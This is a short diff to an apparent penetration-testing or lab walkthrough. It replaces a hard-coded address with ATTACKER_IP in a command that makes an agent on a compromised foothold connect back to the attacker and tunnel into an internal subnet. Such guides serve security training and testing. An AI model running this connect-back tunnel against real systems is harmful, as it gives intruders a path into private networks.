@@ -42,7 +42,7 @@ On the foothold, connect the agent back:
 
 ```bash
 # upload the matching agent binary first, then:
-./agent -connect 10.10.14.5:11601 -ignore-cert
+./agent -connect ATTACKER_IP:11601 -ignore-cert
 ```
 
 In the proxy session, route the internal subnet through the tunnel:
